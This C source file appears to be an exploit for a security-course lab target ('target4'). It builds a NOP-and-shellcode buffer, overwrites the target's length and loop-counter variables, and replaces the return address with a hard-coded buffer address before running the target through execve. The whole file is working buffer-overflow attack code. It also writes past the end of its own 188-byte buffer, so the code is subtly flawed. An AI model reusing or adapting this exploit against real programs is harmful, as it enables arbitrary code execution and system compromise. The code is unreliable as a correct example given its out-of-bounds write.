#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{   
     char *args[3];
     char *env[1];
     char buf[188];
     int i;

     for (i = 0; i < 189; i++) {
         buf[i] = '\x90';
     }

     for (i = 0; i < 45; i++) {
         buf[i] = shellcode[i];
     }

     /* Overwrite len with a large number. */
     buf[168] = '\xFF';
     buf[169] = '\x10';
     buf[170] = '\x10';
     buf[171] = '\x10';

     /* Overwrite i with a number (len+20) so that 
      * it the loop in foo exits at the 189th iteration. */
     buf[172] = '\xEF';
     buf[173] = '\x10';
     buf[174] = '\x10';
     buf[175] = '\x10';

     /* Write address of buf (0x2021fdb0) in place of 
      * where the return address would be written */
     buf[184] = '\xb0';
     buf[185] = '\xfd';
     buf[186] = '\x21';
     buf[187] = '\x20';
     buf[188] = '\x00';

     args[0] = TARGET;
     args[1] = buf;
     args[2] = NULL;

     env[0] = NULL;


     if (0 > execve(TARGET, args, env))
         fprintf(stderr, "execve failed.\n");

     return 0;
}
